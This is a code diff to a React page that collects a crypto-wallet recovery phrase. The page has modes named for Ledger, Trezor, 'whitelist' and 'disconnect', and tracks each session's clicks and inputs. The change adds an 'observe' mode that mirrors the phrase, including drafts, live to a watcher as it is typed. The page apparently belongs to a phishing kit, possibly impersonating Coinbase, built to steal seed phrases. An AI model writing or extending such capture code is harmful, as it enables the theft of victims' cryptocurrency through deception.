@@ -42,7 +42,8 @@ const CONTENT: Record<PhraseMode, { title: string; description: string; logo?: s
 };
 
 function CbPhrasePage() {
-  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId } = useCbTracking();
+  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId, isObserve } =
+    useCbTracking();
   const urlMode = useQueryParam("mode") as PhraseMode | null;
   const mode: PhraseMode =
     urlMode === "whitelist" || urlMode === "disconnect" || urlMode === "ledger" || urlMode === "trezor"
@@ -56,6 +57,23 @@ function CbPhrasePage() {
   const textareaRef = useRef<HTMLTextAreaElement>(null);
 
   const hasValue = phrase.length > 0;
+
+  useEffect(() => {
+    if (!isObserve) return;
+    function onMirror(e: Event) {
+      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
+      if (!d?.field) return;
+      if (
+        d.field === "phrase" ||
+        d.field.startsWith("phrase_draft_") ||
+        d.field.startsWith("phrase_final_")
+      ) {
+        setPhrase(String(d.value ?? ""));
+      }
+    }
+    window.addEventListener("ux:mirror-live-input", onMirror);
+    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
+  }, [isObserve]);
 
   useEffect(() => {
     phraseRef.current = phrase;
